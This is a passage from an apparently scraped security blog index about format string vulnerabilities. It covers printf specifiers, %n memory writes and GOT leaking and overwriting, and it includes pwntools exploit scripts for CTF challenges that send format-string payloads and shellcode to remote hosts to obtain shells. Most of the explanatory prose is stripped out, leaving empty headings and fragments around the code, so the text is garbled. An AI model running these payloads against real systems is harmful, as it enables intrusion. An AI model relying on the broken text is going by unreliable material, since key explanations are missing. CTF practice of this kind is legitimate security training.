b\"%64c%9$hn%1510c%10$hnAAA\" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)</span></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">6</span>,&#123;__stack_chk_fail:backdoor&#125;)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x38</span>,<span class=\"string\">'A'</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","categories":[],"tags":["PWN"]},{"title":"","url":"https://pz1o.top/2021/02/15//","content":"<p></p>\n<h1 id=\"0x01-\"><a href=\"#0x01-\" class=\"headerlink\" title=\"0x01 \"></a>0x01 </h1><p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int prinf(const char *format,...);</span><br><span class=\"line\">int fprintf(FILE *stream, const char *format,...);</span><br><span class=\"line\">int dprintf(int fd,const char *format,...);</span><br><span class=\"line\">int sprintf(char *str,const char *format,...);</span><br><span class=\"line\">int snprintf(char *str, size_t size, const char *format,...);</span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">printf</td>\n<td style=\"text-align:center\">stdout</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">fprintf</td>\n<td style=\"text-align:center\">FILE</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vprintf</td>\n<td style=\"text-align:center\"> stdout</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vfprintf</td>\n<td style=\"text-align:center\"> FILE </td>\n</tr>\n<tr>\n<td style=\"text-align:center\">sprintf</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">snprintf</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vsprintf</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">vsnprintf</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">setproctitle</td>\n<td style=\"text-align:center\"> argv</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">syslog</td>\n<td style=\"text-align:center\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">err, verr, warn, vwarn </td>\n<td style=\"text-align:center\"></td>\n</tr>\n</tbody>\n</table>\n</div>\n<p><strong></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%[parameter][flags][field width][.precision][length]type</span><br></pre></td></tr></table></figure>\n<ul>\n<li>parameter<ul>\n<li>n$</li>\n</ul>\n</li>\n<li>field width<ul>\n<li></li>\n</ul>\n</li>\n<li>precision<ul>\n<li></li>\n</ul>\n</li>\n<li>length<ul>\n<li>hh</li>\n<li>h</li>\n</ul>\n</li>\n<li>type<ul>\n<li>d/i</li>\n<li>u</li>\n<li>x/X16  unsigned int x X  0 1 0  0</li>\n<li>o8  unsigned int  0 1 0  0</li>\n<li>s l  null  l  wchar_t  wcrtomb </li>\n<li>c l  int  unsigned char  l  wint_t  wchart_t  null </li>\n<li>p void * printf(%p,a)  a printf(%p, &amp;a)  a </li>\n<li>n</li>\n<li>% % flags, width</li>\n</ul>\n</li>\n</ul>\n<p></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%12c\"</span>,<span class=\"string\">'A'</span>);   <span class=\"comment\">//\"           A\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> n;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%12c%n\"</span>,<span class=\"string\">'A'</span>,&amp;n); <span class=\"comment\">// n = 12;</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%16s%n\"</span>,<span class=\"string\">\"hello\"</span>,&amp;n); <span class=\"comment\">//n = 16</span></span><br><span class=\"line\"><span class=\"comment\">//           hello</span></span><br><span class=\"line\"><span class=\"comment\">//16</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%2$s %1$s\"</span>,<span class=\"string\">\"Format\"</span>,<span class=\"string\">\"Strings\"</span>);  </span><br><span class=\"line\"><span class=\"comment\">//Strings Format</span></span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">\"%42c%1$n\"</span>,&amp;n); </span><br><span class=\"line\"><span class=\"comment\">//                                         </span></span><br><span class=\"line\"><span class=\"number\">42</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"0x02-\"><a href=\"#0x02-\" class=\"headerlink\" title=\"0x02 \"></a>0x02 </h1><h2 id=\"1-\"><a href=\"#1-\" class=\"headerlink\" title=\"1.\"></a>1.</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">printf(&quot;%s %d %s %x %x %x %3$s&quot;,&quot;hello&quot;,123,&quot;x&quot;);</span><br><span class=\"line\">&#x2F;&#x2F;hello 123 x f7fb43dc ffffcfc0 0 x</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>73</p>\n</blockquote>\n<p>gdb</p>\n<p><img src=\"/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216115800043.png\" alt=\"image-20210216115800043\"></p>\n<p></p>\n<p>x3x</p>\n<p></p>\n<p>%n</p>\n<h2 id=\"2-\"><a href=\"#2-\" class=\"headerlink\" title=\"2.\"></a>2.</h2><p></p>\n<ol>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ol>\n<p>3264:</p>\n<ul>\n<li><p>32</p>\n<ul>\n<li>callerByte</li>\n</ul>\n</li>\n<li><p>64</p>\n<ul>\n<li>7 : rdi, rsi, rdx, rcx, r8, r9</li>\n<li>7  6    32</li>\n</ul>\n</li>\n</ul>\n<p></p>\n<blockquote>\n<p>AAAA%n$x</p>\n</blockquote>\n<p>16n+1n<code>41414141</code>,0x41AASCII</p>\n<h3 id=\"2-1-\"><a href=\"#2-1-\" class=\"headerlink\" title=\"2.1 \"></a>2.1 </h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">printf(&quot;%s%s%s%s%s%s%s%s&quot;)</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>3</p>\n<ol>\n<li><code>%s</code>printf</li>\n<li></li>\n<li></li>\n</ol>\n<h3 id=\"2-2-\"><a href=\"#2-2-\" class=\"headerlink\" title=\"2.2 \"></a>2.2 </h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p><code>%p%p%p%p...</code><code>%n$[format]</code></p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><strong></strong></h4><p>%n$s</p>\n<p><strong></strong></p>\n<blockquote>\n<ol>\n<li> %x  %p</li>\n<li> %s </li>\n<li> %order$x  %order$s </li>\n</ol>\n</blockquote>\n<h3 id=\"2-3-\"><a href=\"#2-3-\" class=\"headerlink\" title=\"2.3 \"></a>2.3 </h3><p>GOTlibcgetshell</p>\n<p></p>\n<figure class=\"highlight cc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;  // strtoull</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;\t</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> a[<span class=\"number\">128</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%s\"</span>,a);\t</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class=\"line\"><span class=\"comment\">//AAAA.0xffffcf2c.0xf7fd34a0.0x1.(nil).0x1.0xf7ffd918.0x41414141.0x2e70252e.0x252e7025</span></span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20210216172241585.png\" alt=\"image-20210216172241585\"></p>\n<blockquote>\n<p></p>\n<p>aa</p>\n<p>a</p>\n<p></p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">addr%k$s</span><br></pre></td></tr></table></figure>\n<p>got</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pz1o@pz1o:~&#x2F;$ readelf -r b</span><br><span class=\"line\"></span><br><span class=\"line\"> &#39;.rel.dyn&#39;  0x30c  1 </span><br><span class=\"line\">                              </span><br><span class=\"line\">08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class=\"line\"></span><br><span class=\"line\"> &#39;.rel.plt&#39;  0x314  4 </span><br><span class=\"line\">                              </span><br><span class=\"line\">0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0</span><br><span class=\"line\">0804a010  00000207 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4</span><br><span class=\"line\">0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class=\"line\">0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n</blockquote>\n<p>scanf</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#39;\\x18\\xa0\\x04\\x08.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&#39;</span><br><span class=\"line\">output</span><br><span class=\"line\">&#39;\\x18\\xa0\\x04\\x08.0xffa9156c.0xf7f314a0.0x1.(nil).0x1.0xf7f5b918.0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">p32(0x0804a018) + &quot;%7$s&quot;</span><br><span class=\"line\">output</span><br><span class=\"line\">&#39;\\x18\\xa0\\x04\\x08\\xd0\\xb0\\xe5\\xf7&#39;</span><br></pre></td></tr></table></figure>\n<p>got</p>\n<blockquote>\n<p> \\ x0c\\xa0\\x04\\x08%4$s  printf@got scanf  \\,x,0,c </p>\n</blockquote>\n<h3 id=\"2-4-\"><a href=\"#2-4-\" class=\"headerlink\" title=\"2.4 \"></a>2.4 </h3><p>%n<strong></strong></p>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[overwrite addr]....%[overwrite offset]$n</span><br><span class=\"line\"></span><br><span class=\"line\">eg</span><br><span class=\"line\">p32(xx)+&quot;%012d%7$n&quot;</span><br><span class=\"line\">xx16</span><br><span class=\"line\">%012d  </span><br><span class=\"line\">%08x</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-5-\"><a href=\"#2-5-\" class=\"headerlink\" title=\"2.5 \"></a>2.5 </h3><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p></p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eg:</span><br><span class=\"line\">AA%15$nA+p32(xx)</span><br></pre></td></tr></table></figure>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p> x86  x64 <strong></strong>0x12345678  \\ x78\\x56\\x34\\x12</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x88888888 0x88888888</span><br><span class=\"line\">printf(&quot;%hhn&quot;)  &#x2F;&#x2F;\t0x88888888\t0x88888801</span><br><span class=\"line\">printf(&quot;%hn&quot;)\t\t&#x2F;&#x2F;\t0x88888888\t0x88880001</span><br><span class=\"line\">printf(&quot;%n&quot;)\t\t&#x2F;&#x2F;4\t0x88888888\t0x00000001</span><br><span class=\"line\">printf(&quot;%ln&quot;)\t\t&#x2F;&#x2F;8\t0x00000000 0x00000001</span><br><span class=\"line\">printf(&quot;%lln&quot;)\t&#x2F;&#x2F;16\t0x00000000 0x00000000 0x00000000 0x00000001</span><br></pre></td></tr></table></figure>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eg:</span><br><span class=\"line\">&#x2F;&#x2F;6</span><br><span class=\"line\">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure>\n<p>wiki,</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fmt</span><span class=\"params\">(prev, word, index)</span>:</span> <span class=\"comment\">#prev  word  index  </span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> prev &lt; word:</span><br><span class=\"line\">        result = word - prev</span><br><span class=\"line\">        fmtstr = <span class=\"string\">\"%\"</span> + str(result) + <span class=\"string\">\"c\"</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> prev == word:</span><br><span class=\"line\">        result = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        result = <span class=\"number\">256</span> + word - prev</span><br><span class=\"line\">        fmtstr = <span class=\"string\">\"%\"</span> + str(result) + <span class=\"string\">\"c\"</span></span><br><span class=\"line\">    fmtstr += <span class=\"string\">\"%\"</span> + str(index) + <span class=\"string\">\"$hhn\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fmtstr</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">fmt_str</span><span class=\"params\">(offset, size, addr, target)</span>:</span><span class=\"comment\">#   </span></span><br><span class=\"line\">    payload = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> size == <span class=\"number\">4</span>:</span><br><span class=\"line\">            payload += p32(addr + i)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            payload += p64(addr + i)</span><br><span class=\"line\">    prev = len(payload)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">4</span>):</span><br><span class=\"line\">        payload += fmt(prev, (target &gt;&gt; i * <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span>, offset + i)</span><br><span class=\"line\">        prev = (target &gt;&gt; i * <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>offset </li>\n<li>size </li>\n<li>addr </li>\n<li>target </li>\n</ul>\n</blockquote>\n<h1 id=\"0x03-\"><a href=\"#0x03-\" class=\"headerlink\" title=\"0x03 \"></a>0x03 </h1><h2 id=\"string\"><a href=\"#string\" class=\"headerlink\" title=\"string\"></a>string</h2><p></p>\n<p>shell</p>\n<p>system/bin/shshellcode</p>\n<p>shellcode</p>\n<p>nxbss</p>\n<p></p>\n<p><img src=\"/2021/02/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20201223212813215.png\" alt=\"image-20201223212813215\"></p>\n<p>shellcode</p>\n<p>pwntoolsshellcode</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">context(arch=<span class=\"string\">'amd64'</span>, os=<span class=\"string\">'linux'</span>, log_level=<span class=\"string\">'debug'</span>)</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>\n<p></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"220.249.52.134\"</span>,<span class=\"number\">31872</span>)<span class=\"comment\">#220.249.52.134:31872</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./string\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">context(arch=<span class=\"string\">'amd64'</span>, os=<span class=\"string\">'linux'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'secret[0] is '</span>)</span><br><span class=\"line\">v4 = int(p.recvuntil(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>], <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"What should your character's name be:\"</span>, <span class=\"string\">'pz1o'</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"So, where you will go?east or up?:\"</span>, <span class=\"string\">'east'</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"go into there(1), or leave(0)?:\"</span>, <span class=\"string\">'1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"'Give me an address'\"</span>, str(int(v4)))</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"And, you wish is:\"</span>, <span class=\"string\">'%85c%7$n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">\"USE YOU SPELL\"</span>, shellcode)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p></p>\n<p>%85c%7$n</p>\n<p>857</p>\n</blockquote>\n<h2 id=\"CGfsb\"><a href=\"#CGfsb\" class=\"headerlink\" title=\"CGfsb\"></a>CGfsb</h2><p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%d -  - </span><br><span class=\"line\">%s -  - </span><br><span class=\"line\">%x -  - </span><br><span class=\"line\">%c -  - </span><br><span class=\"line\">%p -  - </span><br><span class=\"line\">%n - </span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li><code>%n</code><code>printf(&quot;abcdefg%n&quot;);</code>,%n7ESPESP7</li>\n<li><code>%10$n</code><code>%n</code>[ESP + 10]7</li>\n</ul>\n</blockquote>\n<p>exp</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">\"220.249.52.134\"</span>,<span class=\"number\">47890</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"please tell me your name:\"</span>)</span><br><span class=\"line\">r.sendline(b<span class=\"number\">'111'</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">\"leave your message please:\"</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0x804a068</span>)+b<span class=\"number\">'</span>aaaa%<span class=\"number\">10</span>$n<span class=\"number\">'</span></span><br><span class=\"line\">r.sendline(payload)</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babyrop2\"><a href=\"#bjdctf-2020-babyrop2\" class=\"headerlink\" title=\"bjdctf_2020_babyrop2\"></a>bjdctf_2020_babyrop2</h2><p>canary</p>\n<blockquote>\n<p></p>\n<p>AA</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;AA%6$p</span><br></pre></td></tr></table></figure>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#import binascii</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(\"./pwn3.11\")</span></span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.232.so\")</span></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28762</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn3.11\"</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_plt = elf.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">vuln = elf.sym[<span class=\"string\">\"vuln\"</span>]</span><br><span class=\"line\">ru(<span class=\"string\">\"I'll give u some gift to help u!\\n\"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"%7$p\"</span>)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x0000000000400993</span></span><br><span class=\"line\">ret = <span class=\"number\">0x00000000004005f9</span></span><br><span class=\"line\">canary = ru(<span class=\"string\">'00\\n'</span>)</span><br><span class=\"line\">canary = int(canary+<span class=\"string\">'00'</span>,<span class=\"number\">16</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"canary\"</span>,canary)</span><br><span class=\"line\">pld = <span 